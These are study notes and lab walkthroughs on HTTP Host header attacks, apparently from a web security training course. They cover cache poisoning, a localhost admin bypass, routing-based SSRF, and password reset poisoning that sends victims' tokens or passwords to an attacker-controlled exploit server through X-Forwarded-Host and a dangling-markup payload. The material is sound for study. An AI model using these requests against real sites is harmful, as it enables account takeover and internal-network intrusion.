You should try to understand how the website parses the Host header. 
This can sometimes reveal loopholes that can be used to bypass the validation. 
For example, some parsing algorithms will omit the port from the Host header, 
meaning that only the domain name is validated. 
If you are also able to supply a non-numeric port, 
you can leave the domain name untouched to ensure that you reach the target application, 
while potentially injecting a payload via the port.

GET /example HTTP/1.1
Host: vulnerable-website.com:bad-stuff-here



Other sites will try to apply matching logic to allow for arbitrary subdomains. 
In this case, you may be able to bypass the validation entirely by registering an 
arbitrary domain name that ends with the same sequence of characters as a whitelisted one:

GET /example HTTP/1.1
Host: notvulnerable-website.com



Alternatively, you could take advantage of a less-secure subdomain that you have already compromised:

GET /example HTTP/1.1
Host: hacked-subdomain.vulnerable-website.com





Inject duplicate Host headers
One possible approach is to try adding duplicate Host headers. 
Admittedly, this will often just result in your request being blocked. 
However, as a browser is unlikely to ever send such a request, 
you may occasionally find that developers have not anticipated this scenario.
 In this case, you might expose some interesting behavioral quirks.

Different systems and technologies will handle this case differently,
 but it is common for one of the two headers to be given precedence over the other one,
 effectively overriding its value. 
When systems disagree about which header is the correct one,
 this can lead to discrepancies that you may be able to exploit.
 Consider the following request:

GET /example HTTP/1.1
Host: vulnerable-website.com
Host: bad-stuff-here

Let's say the front-end gives precedence to the first instance of the header, 
but the back-end prefers the final instance. Given this scenario, 
you could use the first header to ensure that your request is routed to the intended target 
and use the second header to pass your payload into the server-side code.




Supply an absolute URL
Although the request line typically specifies a relative path on the requested domain, 
many servers are also configured to understand requests for absolute URLs.

The ambiguity caused by supplying both an absolute URL 
and a Host header can also lead to discrepancies between different systems.
 Officially, the request line should be given precedence when routing the request but, 
in practice, this isn't always the case.
You can potentially exploit these discrepancies in much the same way as duplicate Host headers.

GET https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here

Note that you may also need to experiment with different protocols. 
Servers will sometimes behave differently depending on whether the request line contains an HTTP or an HTTPS URL.




Add line wrapping
You can also uncover quirky behavior by indenting HTTP headers with a space character. 
Some servers will interpret the indented header as a wrapped line and,
 therefore, treat it as part of the preceding header's value.
 Other servers will ignore the indented header altogether.

Due to the highly inconsistent handling of this case, 
there will often be discrepancies between different systems that process your request. 
For example, consider the following request:

GET /example HTTP/1.1
    Host: bad-stuff-here
Host: vulnerable-website.com


The website may block requests with multiple Host headers, 
but you may be able to bypass this validation by indenting one of them like this.
 If the front-end ignores the indented header, the request will be processed as an ordinary request for vulnerable-website.com. 
Now let's say the back-end ignores the leading space and gives precedence to the first header in the case of duplicates.
 This discrepancy might allow you to pass arbitrary values via the "wrapped" Host header.





Inject host override headers
As we've already discussed, websites are often accessed via some kind of intermediary system, such as a load balancer or a reverse proxy.
 In this kind of architecture, the Host header that the back-end server receives may contain the domain name for one of these intermediary systems.
 This is usually not relevant for the requested functionality.

To solve this problem, the front-end may inject the X-Forwarded-Host header, 
containing the original value of the Host header from the client's initial request. 
For this reason, when an X-Forwarded-Host header is present, many frameworks will refer to this instead. 
You may observe this behavior even when there is no front-end that uses this header.

You can sometimes use X-Forwarded-Host to inject your malicious input while circumventing any validation on the Host header itself.

GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: bad-stuff-here


Although X-Forwarded-Host is the de facto standard for this behavior,
 you may come across other headers that serve a similar purpose, including:

X-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded



Exploitation


Web cache poisoning via ambiguous requests

Send the GET / request that received a 200 response to Burp Repeater and study the lab's behavior. Observe that the website validates the Host header. After tampering with it, you are unable to still access the home page.
In the original response, notice the verbose caching headers, which tell you when you get a cache hit and how old the cached response is. Add an arbitrary query parameter to your requests to serve as a cache buster, for example, GET /?cb=123. You can simply change this parameter each time you want a fresh response from the back-end server.
Notice that if you add a second Host header with an arbitrary value, this appears to be ignored when validating and routing your request. Crucially, notice that the arbitrary value of your second Host header is reflected in an absolute URL used to import a script from /resources/js/tracking.js.
Remove the second Host header and send the request again using the same cache buster. Notice that you still receive the same cached response containing your injected value.
Go to the exploit server and create a file at /resources/js/tracking.js containing the payload alert(document.cookie). Store the exploit and copy the domain name for your exploit server.
Back in Burp Repeater, add a second Host header containing your exploit server domain name. The request should look something like this:

GET /?cb=123 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net


Send the request a couple of times until you get a cache hit with your exploit server URL reflected in the response. To simulate the victim, request the page in the browser using the same cache buster in the URL. Make sure that the alert() fires.
In Burp Repeater, remove any cache busters and keep replaying the request until you have re-poisoned the cache. The lab is solved when the victim visits the home page.





 Host header authentication bypass


Send the GET / request that received a 200 response to Burp Repeater. Notice that you can change the Host header to an arbitrary value and still successfully access the home page.
Browse to /robots.txt and observe that there is an admin panel at /admin.
Try and browse to /admin. You do not have access, but notice the error message, which reveals that the panel can be accessed by local users.
Send the GET /admin request to Burp Repeater.
In Burp Repeater, change the Host header to localhost and send the request. Observe that you have now successfully accessed the admin panel, which provides the option to delete different users.
Change the request line to GET /admin/delete?username=carlos and send the request to delete Carlos and solve the lab.





SSRF

Classic SSRF vulnerabilities are usually based on XXE or exploitable business logic that sends HTTP requests to a URL derived from user-controllable input. Routing-based SSRF, on the other hand, relies on exploiting the intermediary components that are prevalent in many cloud-based architectures. This includes in-house load balancers and reverse proxies.

Although these components are deployed for different purposes, fundamentally, they receive requests and forward them to the appropriate back-end. If they are insecurely configured to forward requests based on an unvalidated Host header, they can be manipulated into misrouting requests to an arbitrary system of the attacker's choice.

These systems make fantastic targets. They sit in a privileged network position that allows them to receive requests directly from the public web, while also having access to much, if not all, of the internal network. This makes the Host header a powerful vector for SSRF attacks, potentially transforming a simple load balancer into a gateway to the entire internal network.

You can use Burp Collaborator to help identify these vulnerabilities. If you supply the domain of your Collaborator server in the Host header, and subsequently receive a DNS lookup from the target server or another in-path system, this indicates that you may be able to route requests to arbitrary domains.

Having confirmed that you can successfully manipulate an intermediary system to route your requests to an arbitrary public server, the next step is to see if you can exploit this behavior to access internal-only systems. To do this, you'll need to identify private IP addresses that are in use on the target's internal network.
 In addition to any IP addresses that are leaked by the application, you can also scan hostnames belonging to the company to see if any resolve to a private IP address. If all else fails, you can still identify valid IP addresses by simply brute-forcing standard private IP ranges, such as 192.168.0.0/16.



Ruting based ssrf

Send the GET / request that received a 200 response to Burp Repeater.
In Burp Repeater, select the Host header value, right-click and select "Insert Collaborator payload" to replace it with a Collaborator domain name. Send the request.
Go to the Collaborator tab and click "Poll now". You should see a couple of network interactions in the table, including an HTTP request. This confirms that you are able to make the website's middleware issue requests to an arbitrary server.
Send the GET / request to Burp Intruder. In Burp Intruder, go to the "Positions" tab and clear the default payload positions. Delete the value of the Host header and replace it with the following IP address, adding a payload position to the final octet:

Host: 192.168.0.§0§
On the "Payloads" tab, select the payload type "Numbers". Under "Payload settings", enter the following values:

From: 0
To: 255
Step: 1
Click "Start attack". A warning will inform you that the Host header does not match the specified target host. As we've done this deliberately, you can ignore this message.
When the attack finishes, click the "Status" column to sort the results. Notice that a single request received a 302 response redirecting you to /admin. Send this request to Burp Repeater.
In Burp Repeater, change the request line to GET /admin and send the request. In the response, observe that you have successfully accessed the admin panel.
Study the form for deleting users. Notice that it will generate a POST request to /admin/delete with both a CSRF token and username parameter. You need to manually craft an equivalent request to delete Carlos.
Change the path in your request to /admin/delete. Copy the CSRF token from the displayed response and add it as a query parameter to your request. Also add a username parameter containing carlos. The request line should now look like this but with a different CSRF token:

GET /admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos
Copy the session cookie from the Set-Cookie header in the displayed response and add it to your request.
Right-click on your request and select "Change request method". Burp will convert it to a POST request.
Send the request to delete Carlos and solve the lab.



SSRF via flawed request parsing

Send the GET / request that received a 200 response to Burp Repeater and study the lab's behavior. Observe that the website validates the Host header and blocks any requests in which it has been modified.
Observe that you can also access the home page by supplying an absolute URL in the request line as follows:

GET https://YOUR-LAB-ID.web-security-academy.net/
Notice that when you do this, modifying the Host header no longer causes your request to be blocked. Instead, you receive a timeout error. This suggests that the absolute URL is being validated instead of the Host header.
Use Burp Collaborator to confirm that you can make the website's middleware issue requests to an arbitrary server in this way. For example, the following request will trigger an HTTP request to your Collaborator server:

GET https://YOUR-LAB-ID.web-security-academy.net/
Host: BURP-COLLABORATOR-SUBDOMAIN
Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the request.
Send the request containing the absolute URL to Burp Intruder. Use the Host header to scan the IP range 192.168.0.0/24 to identify the IP address of the admin interface. Send this request to Burp Repeater.
In Burp Repeater, append /admin to the absolute URL in the request line and send the request. Observe that you now have access to the admin panel, including a form for deleting users.
Change the absolute URL in your request to point to /admin/delete. Copy the CSRF token from the displayed response and add it as a query parameter to your request. Also add a username parameter containing carlos. The request line should now look like this but with a different CSRF token:

GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos
Copy the session cookie from the Set-Cookie header in the displayed response and add it to your request.
Right-click on your request and select "Change request method". Burp will convert it to a POST request.
Send the request to delete Carlos and solve the lab.




SSRF via a malformed request line
Custom proxies sometimes fail to validate the request line properly, which can allow you to supply unusual, malformed input with unfortunate results.

For example, a reverse proxy might take the path from the request line, prefix it with http://backend-server, and route the request to that upstream URL. This works fine if the path starts with a / character, but what if starts with an @ character instead?

GET @private-intranet/example HTTP/1.1
The resulting upstream URL will be http://backend-server@private-intranet/example, which most HTTP libraries interpret as a request to access private-intranet with the username backend-server.






Connection state attacks

For performance reasons, many websites reuse connections for multiple request/response cycles with the same client. Poorly implemented HTTP servers sometimes work on the dangerous assumption that certain properties, such as the Host header, are identical for all HTTP/1.1 requests sent over the same connection. This may be true of requests sent by a browser, but isn't necessarily the case for a sequence of requests sent from Burp Repeater. This can lead to a number of potential issues.

For example, you may occasionally encounter servers that only perform thorough validation on the first request they receive over a new connection. In this case, you can potentially bypass this validation by sending an innocent-looking initial request then following up with your malicious one down the same connection.


Send the GET / request to Burp Repeater.

Make the following adjustments:

Change the path to /admin.

Change Host header to 192.168.0.1.

Send the request. Observe that you are simply redirected to the homepage.

Duplicate the tab, then add both tabs to a new group.

Select the first tab and make the following adjustments:

Change the path back to /.

Change the Host header back to YOUR-LAB-ID.web-security-academy.net.

Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).

Change the Connection header to keep-alive.

Send the sequence and check the responses. Observe that the second request has successfully accessed the admin panel.

Study the response and observe that the admin panel contains an HTML form for deleting a given user. Make a note of the following details:

The action attribute (/admin/delete)

The name of the input (username)

The csrf token.

On the second tab in your group, use these details to replicate the request that would be issued when submitting the form. The result should look something like this:

POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
Content-Type: x-www-form-urlencoded
Content-Length: CORRECT

csrf=YOUR-CSRF-TOKEN&username=carlos
Send the requests in sequence down a single connection to solve the lab.







How does a password reset work?

Virtually all websites that require a login also implement functionality that allows users to reset their password if they forget it. There are several ways of doing this, with varying degrees of security and practicality. One of the most common approaches goes something like this:

    The user enters their username or email address and submits a password reset request. The website checks that this user exists and then generates a temporary, unique, high-entropy token, which it associates with the user's account on the back-end.

    The website sends an email to the user that contains a link for resetting their password. The user's unique reset token is included as a query parameter in the corresponding URL:
    https://normal-website.com/reset?token=0a1b2c3d4e5f6g7h8i9j
    When the user visits this URL, the website checks whether the provided token is valid and uses it to determine which account is being reset. If everything is as expected, the user is given the option to enter a new password. Finally, the token is destroyed. 

This process is simple enough and relatively secure in comparison to some other approaches. However, its security relies on the principle that only the intended user has access to their email inbox and, therefore, to their unique token. Password reset poisoning is a method of stealing this token in order to change another user's password.
How to construct a password reset poisoning attack

If the URL that is sent to the user is dynamically generated based on controllable input, such as the Host header, it may be possible to construct a password reset poisoning attack as follows:

    The attacker obtains the victim's email address or username, as required, and submits a password reset request on their behalf. When submitting the form, they intercept the resulting HTTP request and modify the Host header so that it points to a domain that they control. For this example, we'll use evil-user.net.

    The victim receives a genuine password reset email directly from the website. This seems to contain an ordinary link to reset their password and, crucially, contains a valid password reset token that is associated with their account. However, the domain name in the URL points to the attacker's server:
    https://evil-user.net/reset?token=0a1b2c3d4e5f6g7h8i9j
    If the victim clicks this link (or it is fetched in some other way, for example, by an antivirus scanner) the password reset token will be delivered to the attacker's server. The attacker can now visit the real URL for the vulnerable website and supply the victim's stolen token via the corresponding parameter. They will then be able to reset the user's password to whatever they like and subsequently log in to their account. 

In a real attack, the attacker may seek to increase the probability of the victim clicking the link by first warming them up with a fake breach notification, for example.

Even if you can't control the password reset link, you can sometimes use the Host header to inject HTML into sensitive emails. Note that email clients typically don't execute JavaScript, but other HTML injection techniques like dangling 





1

    Go to the login page and notice the "Forgot your password?" functionality. Request a password reset for your own account.
    Go to the exploit server and open the email client. Observe that you have received an email containing a link to reset your password. Notice that the URL contains the query parameter temp-forgot-password-token.
    Click the link and observe that you are prompted to enter a new password. Reset your password to whatever you want.
    In Burp, study the HTTP history. Notice that the POST /forgot-password request is used to trigger the password reset email. This contains the username whose password is being reset as a body parameter. Send this request to Burp Repeater.
    In Burp Repeater, observe that you can change the Host header to an arbitrary value and still successfully trigger a password reset. Go back to the email server and look at the new email that you've received. Notice that the URL in the email contains your arbitrary Host header instead of the usual domain name.
    Back in Burp Repeater, change the Host header to your exploit server's domain name (YOUR-EXPLOIT-SERVER-ID.exploit-server.net) and change the username parameter to carlos. Send the request.
    Go to your exploit server and open the access log. You will see a request for GET /forgot-password with the temp-forgot-password-token parameter containing Carlos's password reset token. Make a note of this token.
    Go to your email client and copy the genuine password reset URL from your first email. Visit this URL in the browser, but replace your reset token with the one you obtained from the access log.
    Change Carlos's password to whatever you want, then log in as carlos to solve the lab.


2

With Burp running, investigate the password reset functionality. Observe that a link containing a unique reset token is sent via email.
Send the POST /forgot-password request to Burp Repeater. Notice that the X-Forwarded-Host header is supported and you can use it to point the dynamically generated reset link to an arbitrary domain.
Go to the exploit server and make a note of your exploit server URL.

Go back to the request in Burp Repeater and add the X-Forwarded-Host header with your exploit server URL:
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Change the username parameter to carlos and send the request.
Go to the exploit server and open the access log. You should see a GET /forgot-password request, which contains the victim's token as a query parameter. Make a note of this token.
Go back to your email client and copy the valid password reset link (not the one that points to the exploit server). Paste this into the browser and change the value of the temp-forgot-password-token parameter to the value that you stole from the victim.
Load this URL and set a new password for Carlos's account.
Log in to Carlos's account using the new password to solve the lab


3


    Go to the login page and request a password reset for your own account.
    Go to the exploit server and open the email client to find the password reset email. Observe that the link in the email simply points to the generic login page and the URL does not contain a password reset token. Instead, a new password is sent directly in the email body text.
    In the proxy history, study the response to the GET /email request. Observe that the HTML content for your email is written to a string, but this is being sanitized using the DOMPurify library before it is rendered by the browser.
    In the email client, notice that you have the option to view each email as raw HTML instead. Unlike the rendered version of the email, this does not appear to be sanitized in any way.

    Send the POST /forgot-password request to Burp Repeater. Observe that tampering with the domain name in the Host header results in a server error. However, you are able to add an arbitrary, non-numeric port to the Host header and still reach the site as normal. Sending this request will still trigger a password reset email:
    Host: YOUR-LAB-ID.web-security-academy.net:arbitraryport
    In the email client, check the raw version of your emails. Notice that your injected port is reflected inside a link as an unescaped, single-quoted string. This is later followed by the new password.

    Send the POST /forgot-password request again, but this time use the port to break out of the string and inject a dangling-markup payload pointing to your exploit server:
    Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
    Check the email client. You should have received a new email in which most of the content is missing. Go to the exploit server and check the access log. Notice that there is an entry for a request that begins GET /?/login'>[…], which contains the rest of the email body, including the new password.
    In Burp Repeater, send the request one last time, but change the username parameter to carlos. Refresh the access log and obtain Carlos's new password from the corresponding log entry.
    Log in as carlos using this new password to solve the lab.

